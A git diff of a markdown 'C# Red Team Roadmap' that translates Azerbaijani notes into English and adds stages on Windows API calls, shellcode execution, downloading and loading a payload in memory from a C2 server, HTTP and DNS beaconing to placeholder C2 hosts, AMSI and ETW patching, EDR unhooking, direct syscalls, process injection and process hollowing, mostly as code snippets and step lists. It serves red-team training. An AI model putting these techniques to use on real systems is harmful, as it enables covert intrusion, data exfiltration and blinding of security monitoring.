@@ -1,20 +1,14 @@
-# C# Red Team Roadmap — Tam Versiya
-
-> **Hədəf:** Red Team tooling üçün lazım olan C# bazasını qurmaq.
-
----
-
 ## 🟢 Stage 1 — Language Basics
-> Hamısı mütləqdir. Sintaksis bazası olmadan heç nə yazılmaz.
+> Mandatory. No tool can be written without syntax fundamentals.
 
 ### Step 1 — Hello World & Program Structure
-`namespace`, `class`, `Main()` — proqramın giriş nöqtəsi.
+`namespace`, `class`, `Main()` — program entry point.
 ```csharp
 Console.WriteLine("Hello, World!");
 ```
 
 ### Step 2 — Variables & Data Types
-`int`, `double`, `float`, `bool`, `char`, `string`. Value type vs reference type fərqi.
+`int`, `double`, `float`, `bool`, `char`, `string`. Value type vs reference type.
 ```csharp
 int port = 4444;
 string host = "10.0.0.1";
@@ -22,7 +16,7 @@ bool isOpen = true;
 ```
 
 ### Step 3 — Type Conversion
-`Convert.ToInt32()`, `int.Parse()`, `int.TryParse()`. Network data parse edəndə daim lazım olur.
+`Convert.ToInt32()`, `int.Parse()`, `int.TryParse()`. Essential when parsing network data.
 ```csharp
 string input = "4444";
 int port = int.Parse(input);
@@ -46,28 +40,28 @@ else Console.WriteLine("[-] Filtered");
 ```
 
 ### Step 7 — Ternary & Null Coalescing
-`? :` və `??` — qısa şərtlər üçün.
+`? :` and `??` — compact conditionals.
 ```csharp
 string status = isOpen ? "OPEN" : "CLOSED";
 string target = input ?? "127.0.0.1";
 ```
 
 ### Step 8 — Loops: for & while
-Loop dəyişənləri, `break`, `continue`.
+Loop variables, `break`, `continue`.
 ```csharp
 for (int port = 1; port <= 1024; port++)
     Scan(host, port);
 ```
 
 ### Step 9 — Loops: foreach & do-while
-Collection-lar üzərində iterate etmək.
+Iterating over collections.
 ```csharp
 foreach (string host in liveHosts)
     Console.WriteLine($"[+] {host}");
 ```
 
 ### Step 10 — Methods
-Parametrlər, return tipləri, `void`, overloading.
+Parameters, return types, `void`, overloading.
 ```csharp
 bool IsPortOpen(string host, int port) => TcpConnect(host, port);
 ```
@@ -75,16 +69,17 @@ bool IsPortOpen(string host, int port) => TcpConnect(host, port);
 ---
 
 ## 🔵 Stage 2 — Collections
+> Every Red Team tool stores and processes data — hosts, ports, credentials, results.
 
 ### Step 11 — Arrays
-Fixed-size. Shellcode byte array-ləri, sabit port siyahıları.
+Fixed-size. Shellcode byte arrays, static port lists.
 ```csharp
 byte[] shellcode = { 0x90, 0x90, 0xCC };
 int[] commonPorts = { 22, 80, 443, 3389 };
 ```
 
 ### Step 12 — List\<T\>
-Dynamic collection. Live host-lar, açıq portlar, loot toplamaq.
+Dynamic collection. Live hosts, open ports, loot accumulation.
 ```csharp
 var liveHosts = new List<string>();
 liveHosts.Add("10.0.0.1");
@@ -92,7 +87,7 @@ liveHosts.Sort();
 ```
 
 ### Step 13 — Dictionary\<TKey, TValue\>
-Key-value. Credential store, port→service mapping, recon nəticələri.
+Key-value store. Credential storage, port-to-service mapping, recon results.
 ```csharp
 var creds = new Dictionary<string, string>();
 creds["admin"] = "Password123!";
@@ -100,11 +95,11 @@ var portMap = new Dictionary<int, string> { {22, "SSH"}, {3389, "RDP"} };
 ```
 
 ### Step 14 — HashSet\<T\>
-Unikal elementlər. Scan edilmiş IP-ləri dedup etmək.
+Unique elements only. Deduplicating scanned IPs.
 ```csharp
 var scanned = new HashSet<string>();
 scanned.Add("10.0.0.1");
-scanned.Add("10.0.0.1"); // ignore edilir
+scanned.Add("10.0.0.1"); // ignored
 ```
 
 ### Step 15 — Queue\<T\> & Stack\<T\>
@@ -118,10 +113,11 @@ string next = taskQueue.Dequeue(); // → "whoami"
 
 ---
 
-## 🟣 Stage 3 — OOP
+## 🟣 Stage 3 — Object-Oriented Programming
+> Structuring tools professionally — Scanner, Beacon, Implant, C2 channel classes.
 
 ### Step 16 — Classes & Objects
-Tool-ları strukturlaşdırmaq üçün — Scanner, Beacon, Implant class-ları.
+Structuring tools — Scanner, Beacon, Implant classes.
 ```csharp
 class PortScanner
 {
@@ -131,7 +127,7 @@ class PortScanner
 ```
 
 ### Step 17 — Properties & Access Modifiers
-`public`, `private`, `internal`. Implant config-lərini encapsulate etmək.
+`public`, `private`, `internal`. Encapsulating implant configs.
 ```csharp
 class BeaconConfig
 {
@@ -142,7 +138,7 @@ class BeaconConfig
 ```
 
 ### Step 18 — Constructors
-Parameterli constructor — tool initialization.
+Parameterized constructors — tool initialization.
 ```csharp
 class ReverseShell
 {
@@ -157,9 +153,8 @@ class ReverseShell
 }
 ```
 
-### Step 19 — Interface ⬅️ YENİ
-`interface` — fərqli C2 channel-larını eyni contract altında birləşdirmək.
-Virtual/override inheritance-dan fərqli olaraq, interface **nə edəcəyini** müəyyən edir, **necə** deyil.
+### Step 19 — Interfaces
+`interface` — unifying different C2 channels under a single contract. Defines *what*, not *how*.
 ```csharp
 interface IC2Channel
 {
@@ -178,14 +173,10 @@ class TcpChannel : IC2Channel
     public string Receive() => ReadSocket();
     public void Send(string data) => WriteSocket(data);
 }
-
-// İstifadəsi — hansı channel olduğu fərq etmir
-IC2Channel channel = new HttpChannel();
-string task = channel.Receive();
 ```
 
 ### Step 20 — Polymorphism & Virtual Methods
-Fərqli C2 channel-ları üçün base class davranışını override etmək.
+Overriding base class behavior for different C2 channel implementations.
 ```csharp
 class C2Channel
 {
@@ -196,15 +187,10 @@ class HttpChannel : C2Channel
 {
     public override string Receive() => PollHttp();
 }
-
-class TcpChannel : C2Channel
-{
-    public override string Receive() => ReadSocket();
-}
 ```
 
 ### Step 21 — Static Members & Static Classes
-Utility class-ları — helper metodlar, sabit config dəyərləri.
+Utility classes — helper methods, constant config values.
 ```csharp
 static class Utils
 {
@@ -216,23 +202,24 @@ static class Utils
 ---
 
 ## 🟡 Stage 4 — LINQ
+> Filter, transform, and query collections — essential for processing recon data.
 
 ### Step 22 — Where & Select
-Şərtə görə filter + transform. Port/host siyahılarını emal etmək.
+Filter by condition + transform. Processing port and host lists.
 ```csharp
 var highPorts = ports.Where(p => p > 1024).ToList();
 var hostnames = results.Select(r => r.Hostname).ToList();
 ```
 
 ### Step 23 — OrderBy, GroupBy, Distinct
-Nəticələri sırala, qruplaşdır, təkrarları sil.
+Sort results, group, remove duplicates.
 ```csharp
 var sorted = openPorts.OrderBy(p => p).ToList();
 var unique = foundHosts.Distinct().ToList();
 ```
 
 ### Step 24 — First, Any, All, Count
-Sürətli yoxlamalar — hər hansı admin var mı, port açıqdırmı.
+Quick checks — is there any admin? Is a port open?
 ```csharp
 bool hasAdmin = users.Any(u => u.Contains("admin"));
 int openCount = ports.Count(p => p < 1024);
@@ -242,9 +229,10 @@ string first = liveHosts.FirstOrDefault();
 ---
 
 ## 🔴 Stage 5 — Essentials
+> Every Red Team tool in production relies on these.
 
 ### Step 25 — Exception Handling
-Network tooling-də mütləq lazım — connection fail, timeout, access denied.
+Mandatory in network tooling — connection failures, timeouts, access denied.
 ```csharp
 try
 {
@@ -255,14 +243,11 @@ catch (SocketException ex)
 {
     Console.WriteLine($"[-] {host}:{port} — {ex.Message}");
 }
-finally
-{
-    // cleanup
-}
+finally { /* cleanup */ }
 ```
 
 ### Step 26 — Nullable Types & Null Safety
-Null check olmadan tool-lar crash edir.
+Without null checks, tools crash.
 ```csharp
 string? response = GetC2Response();
 string cmd = response ?? "sleep";
@@ -270,94 +255,49 @@ int? pid = FindProcess("lsass")?.Id;
 ```
 
 ### Step 27 — Delegates, Lambda, Func/Action
-Callback-lər, async operation-lar, LINQ chain-ləri üçün mütləq lazım.
+Callbacks, async operations, LINQ chains.
 ```csharp
 Action<string> log = msg => Console.WriteLine($"[*] {msg}");
 Func<string, int, bool> isOpen = (host, port) => TcpConnect(host, port);
 ```
 
-### Step 28 — using & IDisposable ⬅️ YENİ
-Network connection-lar, file stream-lər mütləq dispose edilməlidir.
-`using` — scope bitəndə avtomatik `Dispose()` çağırır. Memory leak və connection leak qarşısını alır.
+### Step 28 — using & IDisposable
+Network connections and file streams must be disposed. `using` calls `Dispose()` automatically.
 ```csharp
-// using statement — scope bitəndə avtomatik bağlanır
 using (TcpClient tc = new TcpClient())
 {
     tc.Connect(host, port);
-    // scope bitdi → tc.Dispose() avtomatik çağrılır
 }
 
-// Modern C# — using declaration
-using FileStream fs = File.OpenRead("wordlist.txt");
-// method bitəndə avtomatik dispose olur
-
-// Öz class-ında implement etmək
 class ScanSession : IDisposable
 {
     private TcpClient _client = new TcpClient();
-
-    public void Dispose()
-    {
-        _client?.Close();
-        Console.WriteLine("[*] Session closed");
-    }
+    public void Dispose() => _client?.Close();
 }
 ```
 
-### Step 29 — Encoding & Byte Conversion ⬅️ YENİ
-Shellcode, beacon data, XOR encryption, Base64 payload — hamısı byte əməliyyatlarıdır.
+### Step 29 — Encoding & Byte Conversion
+Shellcode, beacon data, XOR encryption, Base64 payloads — all byte operations.
 ```csharp
-// String → Byte
-byte[] bytes = Encoding.UTF8.GetBytes("whoami");
-
-// Byte → String
-string text = Encoding.UTF8.GetString(bytes);
-
-// Base64 encode/decode — payload obfuscation
+byte[] bytes   = Encoding.UTF8.GetBytes("whoami");
 string b64     = Convert.ToBase64String(bytes);
 byte[] decoded = Convert.FromBase64String(b64);
 
-// Hex string → byte array — shellcode
-string hex     = "90 90 CC";
-byte[] shellcode = hex.Split(' ')
-                      .Select(h => Convert.ToByte(h, 16))
-                      .ToArray();
-
-// XOR encryption — basic obfuscation
 byte key = 0x41;
-byte[] encrypted = bytes.Select(b => (byte)(b ^ key)).ToArray();
+byte[] xored = bytes.Select(b => (byte)(b ^ key)).ToArray();
 ```
 
-### Step 30 — File I/O ⬅️ YENİ
-Wordlist oxumaq, loot yazmaq, config faylı — hər tool-da lazımdır.
+### Step 30 — File I/O
+Reading wordlists, writing loot, loading configs — required by every tool.
 ```csharp
-// Wordlist oxu — brute force
 string[] passwords = File.ReadAllLines("wordlist.txt");
-
-// Loot fayla yaz
-File.WriteAllText("loot.txt", "admin:Password123!");
-
-// Nəticələri append et — hər scan-dan sonra
 File.AppendAllText("results.txt", $"[+] {host}:{port} OPEN\n");
-
-// Faylın mövcudluğunu yoxla
-if (File.Exists("config.txt"))
-{
-    string config = File.ReadAllText("config.txt");
-}
-
-// Bütün sətirləri List-ə yüklə
 List<string> targets = File.ReadAllLines("targets.txt").ToList();
 ```
 
-### Step 31 — Async / Await ⬅️ YENİ
-Network tool-ların ən kritik mövzusu. Sinxron scan — yavaş. Async scan — sürətli.
+### Step 31 — Async / Await
+The most critical topic for network tools. Synchronous scan = slow. Async scan = fast.
 ```csharp
-// Sinxron — port 1 bitməmiş port 2 başlamır (yavaş)
-for (int p = 1; p <= 1024; p++)
-    ScanPort(host, p);
-
-// Async — hamısı paralel işləyir (sürətli)
 async Task ScanPortAsync(string host, int port)
 {
     try
@@ -369,56 +309,408 @@ async Task ScanPortAsync(string host, int port)
     catch { /* closed */ }
 }
 
-// 1024 portu paralel scan et
 var tasks = Enumerable.Range(1, 1024)
     .Select(p => ScanPortAsync(host, p));
 
 await Task.WhenAll(tasks);
+```
 
-// HTTP beacon — async
-async Task<string> BeaconAsync(string c2Url)
+---
+
+## ⚫ Stage 6 — Windows Internals & API
+> This is where Red Team C# tooling actually begins.
+
+### Step 32 — P/Invoke Basics
+Calling Windows API functions directly from C# using `DllImport`.
+```csharp
+using System.Runtime.InteropServices;
+
+[DllImport("kernel32.dll")]
+static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+
+[DllImport("kernel32.dll")]
+static extern bool CloseHandle(IntPtr handle);
+```
+
+### Step 33 — Windows Data Types
+Mapping Windows types to C# — `HANDLE`, `DWORD`, `LPVOID`, `BOOL`.
+```csharp
+// Windows HANDLE → IntPtr
+// Windows DWORD  → uint
+// Windows BOOL   → bool
+// Windows LPVOID → IntPtr
+
+[DllImport("kernel32.dll")]
+static extern IntPtr VirtualAlloc(
+    IntPtr lpAddress,
+    uint dwSize,
+    uint flAllocationType,
+    uint flProtect
+);
+```
+
+### Step 34 — Process Enumeration
+Listing running processes — finding targets for injection or privilege escalation.
+```csharp
+using System.Diagnostics;
+
+foreach (Process proc in Process.GetProcesses())
 {
-    using HttpClient client = new HttpClient();
-    return await client.GetStringAsync(c2Url);
+    Console.WriteLine($"[{proc.Id}] {proc.ProcessName}");
+}
+
+Process lsass = Process.GetProcessesByName("lsass").FirstOrDefault();
+```
+
+### Step 35 — Handle & Memory Basics
+Opening process handles, reading/writing remote process memory.
+```csharp
+[DllImport("kernel32.dll")]
+static extern bool ReadProcessMemory(
+    IntPtr hProcess,
+    IntPtr lpBaseAddress,
+    byte[] lpBuffer,
+    int nSize,
+    out int lpNumberOfBytesRead
+);
+
+[DllImport("kernel32.dll")]
+static extern bool WriteProcessMemory(
+    IntPtr hProcess,
+    IntPtr lpBaseAddress,
+    byte[] lpBuffer,
+    int nSize,
+    out int lpNumberOfBytesWritten
+);
+```
+
+### Step 36 — Token & Privilege Basics
+Querying and adjusting process token privileges.
+```csharp
+[DllImport("advapi32.dll")]
+static extern bool OpenProcessToken(
+    IntPtr ProcessHandle,
+    uint DesiredAccess,
+    out IntPtr TokenHandle
+);
+
+// TOKEN_QUERY = 0x0008
+// TOKEN_ADJUST_PRIVILEGES = 0x0020
+```
+
+---
+
+## 🔥 Stage 7 — Memory Manipulation
+> Required for shellcode execution, injection, and in-memory payload loading.
+
+### Step 37 — unsafe & Pointers
+Direct memory access using C# pointers. Required for low-level operations.
+```csharp
+unsafe
+{
+    int value = 42;
+    int* ptr = &value;
+    Console.WriteLine(*ptr); // → 42
+
+    // Pinning a byte array for shellcode
+    fixed (byte* p = shellcode)
+    {
+        // p is a raw pointer to the byte array
+    }
 }
 ```
 
----
+### Step 38 — Marshal Class
+Converting between managed and unmanaged memory — bridge between C# and Windows API.
+```csharp
+using System.Runtime.InteropServices;
 
-## 📌 Oxuma Sırası
+// Allocate unmanaged memory
+IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
+Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
 
-| Mərhələ | Mövzu | Vaxt |
-|---|---|---|
-| 1 | Stage 1 — Steps 1–10 | 3–4 gün |
-| 2 | Stage 2 — Steps 11–15 | 2–3 gün |
-| 3 | Stage 3 — Steps 16–21 | 3–4 gün |
-| 4 | Stage 4 — Steps 22–24 | 1–2 gün |
-| 5 | Stage 5 — Steps 25–31 | 3–4 gün |
-| 6 | **Red Team Library Roadmap-a keç** | — |
+// Copy back to managed
+byte[] buffer = new byte[shellcode.Length];
+Marshal.Copy(ptr, buffer, 0, shellcode.Length);
 
----
-
-## ⚡ Sonra Keçəcəyin Mövzular
-
-Bu roadmap bitdikdən sonra birbaşa:
-
-```
-System.Net.Sockets              → Reverse shell, C2 channel
-System.Diagnostics              → Process execution, enumeration
-System.Net                      → HTTP beacon, payload download
-System.Runtime.InteropServices  → P/Invoke, shellcode injection
-System.Reflection               → In-memory execution, AV bypass
-System.Security.Cryptography    → C2 traffic encryption
+Marshal.FreeHGlobal(ptr);
 ```
 
+### Step 39 — VirtualAlloc & Memory Protection
+Allocating executable memory — foundation of shellcode execution.
+```csharp
+const uint MEM_COMMIT  = 0x1000;
+const uint MEM_RESERVE = 0x2000;
+const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+[DllImport("kernel32.dll")]
+static extern IntPtr VirtualAlloc(
+    IntPtr lpAddress, uint dwSize,
+    uint flAllocationType, uint flProtect
+);
+
+[DllImport("kernel32.dll")]
+static extern bool VirtualProtect(
+    IntPtr lpAddress, uint dwSize,
+    uint flNewProtect, out uint lpflOldProtect
+);
+```
+
+### Step 40 — CreateThread & Shellcode Execution
+Executing shellcode in the current process via a new thread.
+```csharp
+[DllImport("kernel32.dll")]
+static extern IntPtr CreateThread(
+    IntPtr lpThreadAttributes,
+    uint dwStackSize,
+    IntPtr lpStartAddress,
+    IntPtr lpParameter,
+    uint dwCreationFlags,
+    out uint lpThreadId
+);
+
+[DllImport("kernel32.dll")]
+static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMs);
+
+// Execution flow:
+// VirtualAlloc → Marshal.Copy(shellcode) → CreateThread → WaitForSingleObject
+```
+
 ---
 
-## 🆕 Əlavə Edilən Mövzular
+## 🟠 Stage 8 — Reflection & In-Memory Loading
+> Loading and executing assemblies entirely in memory — no file touches disk.
 
-| Step | Mövzu | Niyə Vacibdir |
-|---|---|---|
-| 19 | Interface | C2 channel abstraction, pluggable architecture |
-| 28 | using & IDisposable | Connection leak, memory leak qarşısını alır |
-| 29 | Encoding & Bytes | Shellcode, XOR, Base64 — hər tool-da lazım |
-| 30 | File I/O | Wordlist, loot, config — hər tool-da lazım |
-| 31 | Async / Await | Paralel scan — tool-ların ən kritik mövzusu |
+### Step 41 — Reflection Basics
+Inspecting types, methods, and properties at runtime.
+```csharp
+using System.Reflection;
+
+Assembly asm = Assembly.GetExecutingAssembly();
+foreach (Type t in asm.GetTypes())
+    Console.WriteLine(t.FullName);
+
+Type target = asm.GetType("MyNamespace.Payload");
+MethodInfo method = target.GetMethod("Run");
+method.Invoke(null, null);
+```
+
+### Step 42 — Assembly.Load() — In-Memory Execution
+Loading a .NET assembly from a byte array — the payload never touches disk.
+```csharp
+// Download payload bytes from C2
+byte[] asmBytes = await DownloadPayload(c2Url);
+
+// Load assembly entirely in memory
+Assembly asm = Assembly.Load(asmBytes);
+
+// Invoke entry point
+Type type = asm.GetType("Payload.Program");
+MethodInfo run = type.GetMethod("Execute");
+run.Invoke(null, new object[] { args });
+```
+
+### Step 43 — Dynamic Invocation
+Calling methods dynamically without static references — useful for evading static analysis.
+```csharp
+// Instead of direct P/Invoke (detectable):
+// var result = VirtualAlloc(...);
+
+// Dynamic invocation via reflection:
+Type kernel32 = Type.GetType("...");
+MethodInfo virtualAlloc = kernel32.GetMethod("VirtualAlloc");
+object result = virtualAlloc.Invoke(null, new object[] { ... });
+```
+
+---
+
+## 🔴 Stage 9 — Networking & C2 Communication
+> Building real C2 channels — HTTP, TCP, DNS.
+
+### Step 44 — TCP Client & Server
+Raw TCP communication — foundation of reverse shells and C2 channels.
+```csharp
+// TCP Client (implant side)
+using TcpClient client = new TcpClient();
+await client.ConnectAsync("10.0.0.1", 4444);
+NetworkStream stream = client.GetStream();
+byte[] buf = new byte[4096];
+int n = await stream.ReadAsync(buf, 0, buf.Length);
+string cmd = Encoding.UTF8.GetString(buf, 0, n);
+
+// TCP Listener (C2 side)
+TcpListener listener = new TcpListener(IPAddress.Any, 4444);
+listener.Start();
+TcpClient conn = await listener.AcceptTcpClientAsync();
+```
+
+### Step 45 — HTTP Beaconing
+HTTP-based C2 communication — blends with normal web traffic.
+```csharp
+using HttpClient http = new HttpClient();
+
+// Beacon check-in — GET task
+string task = await http.GetStringAsync("http://c2.host/task");
+
+// Send results — POST output
+var content = new StringContent(output, Encoding.UTF8, "application/json");
+await http.PostAsync("http://c2.host/result", content);
+
+// Jitter — randomized sleep to evade timing detection
+int jitter = new Random().Next(1000, 5000);
+await Task.Delay(sleepInterval * 1000 + jitter);
+```
+
+### Step 46 — DNS over HTTPS (DoH) Beaconing
+Covert C2 channel via DNS queries — bypasses many network-layer controls.
+```csharp
+// Encode command output in DNS subdomain
+string encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(output))
+    .Replace("+", "-").Replace("/", "_").Replace("=", "");
+
+string dnsQuery = $"{encoded}.c2domain.com";
+
+// Query via DoH to avoid local DNS monitoring
+string dohUrl = $"https://1.1.1.1/dns-query?name={dnsQuery}&type=TXT";
+string response = await http.GetStringAsync(dohUrl);
+```
+
+### Step 47 — Named Pipes
+Lateral movement communication channel — used for inter-process and cross-host C2.
+```csharp
+using System.IO.Pipes;
+
+// Server (C2 / operator side)
+using NamedPipeServerStream server = new NamedPipeServerStream("redteam");
+await server.WaitForConnectionAsync();
+
+// Client (implant side)
+using NamedPipeClientStream client = new NamedPipeClientStream(".", "redteam",
+    PipeDirection.InOut);
+await client.ConnectAsync();
+```
+
+---
+
+## 🟤 Stage 10 — AV / EDR Evasion
+> Techniques to bypass security controls — detection evasion, hook circumvention.
+
+### Step 48 — AMSI Bypass
+Patching the Anti-Malware Scan Interface in memory to prevent script scanning.
+```csharp
+// AMSI scans managed code at runtime
+// Patching AmsiScanBuffer() to always return AMSI_RESULT_CLEAN
+
+[DllImport("kernel32")]
+static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+[DllImport("kernel32")]
+static extern IntPtr LoadLibrary(string name);
+
+[DllImport("kernel32")]
+static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+    uint flNewProtect, out uint lpflOldProtect);
+
+// Concept: find AmsiScanBuffer → patch first bytes → return clean
+```
+
+### Step 49 — ETW Patching
+Disabling Event Tracing for Windows to blind EDR telemetry collection.
+```csharp
+// ETW is used by EDRs to collect runtime telemetry
+// EtwEventWrite() in ntdll.dll can be patched to suppress events
+
+// Same pattern as AMSI:
+// LoadLibrary("ntdll.dll") → GetProcAddress("EtwEventWrite")
+// → VirtualProtect(RW) → patch bytes → VirtualProtect(restore)
+```
+
+### Step 50 — Unhooking via Fresh NTDLL
+EDRs hook ntdll.dll functions. Loading a fresh copy from disk bypasses their hooks.
+```csharp
+// EDR hook flow:
+// Your code → ntdll (hooked) → EDR inspection → syscall
+
+// Unhook flow:
+// 1. Read ntdll.dll from disk (C:\Windows\System32\ntdll.dll)
+// 2. Map it manually into memory
+// 3. Overwrite the hooked .text section with the clean version
+// 4. Your code now calls unhooked syscalls directly
+```
+
+### Step 51 — Direct Syscalls
+Bypassing EDR userland hooks by invoking syscalls directly without going through ntdll.
+```csharp
+// Standard API call (hookable):
+// VirtualAlloc() → ntdll.NtAllocateVirtualMemory (hooked by EDR)
+
+// Direct syscall approach:
+// Embed raw syscall stub → call kernel directly
+// Tools: SysWhispers2/3, D/Invoke
+
+// Syscall stub example (x64 assembly):
+// mov r10, rcx
+// mov eax, <syscall number>
+// syscall
+// ret
+```
+
+### Step 52 — Payload Obfuscation
+Hiding shellcode from static AV signatures — encryption and encoding at rest.
+```csharp
+// XOR encrypt shellcode before embedding
+byte key = 0x37;
+byte[] encrypted = shellcode.Select(b => (byte)(b ^ key)).ToArray();
+
+// Decrypt at runtime just before execution
+byte[] decrypted = encrypted.Select(b => (byte)(b ^ key)).ToArray();
+
+// AES encryption for stronger obfuscation
+using Aes aes = Aes.Create();
+aes.Key = Convert.FromBase64String(storedKey);
+aes.IV  = Convert.FromBase64String(storedIV);
+ICryptoTransform decryptor = aes.CreateDecryptor();
+byte[] plain = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
+```
+
+### Step 53 — Process Injection — Classic
+Injecting shellcode into a remote process — the foundation of most post-exploitation.
+```csharp
+// Classic injection flow:
+// 1. OpenProcess(PROCESS_ALL_ACCESS, pid)
+// 2. VirtualAllocEx(hProcess, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+// 3. WriteProcessMemory(hProcess, allocAddr, shellcode)
+// 4. CreateRemoteThread(hProcess, allocAddr)
+
+[DllImport("kernel32.dll")]
+static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+    uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+    IntPtr lpThreadAttributes, uint dwStackSize,
+    IntPtr lpStartAddress, IntPtr lpParameter,
+    uint dwCreationFlags, out uint lpThreadId);
+```
+
+### Step 54 — Process Hollowing
+Creating a suspended process, replacing its memory with a payload, then resuming.
+```csharp
+// Process hollowing flow:
+// 1. CreateProcess(target, SUSPENDED)
+// 2. NtUnmapViewOfSection — hollow out the original image
+// 3. VirtualAllocEx — allocate space for payload
+// 4. WriteProcessMemory — write payload
+// 5. SetThreadContext — update entry point register (RCX/EIP)
+// 6. ResumeThread — execute payload under legitimate process identity
+
+[DllImport("kernel32.dll")]
+static extern bool CreateProcess(string lpApplicationName,
+    string lpCommandLine, IntPtr lpProcessAttributes,
+    IntPtr lpThreadAttributes, bool bInheritHandles,
+    uint dwCreationFlags, IntPtr lpEnvironment,
+    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
+    out PROCESS_INFORMATION lpProcessInformation);
+```
+
+---
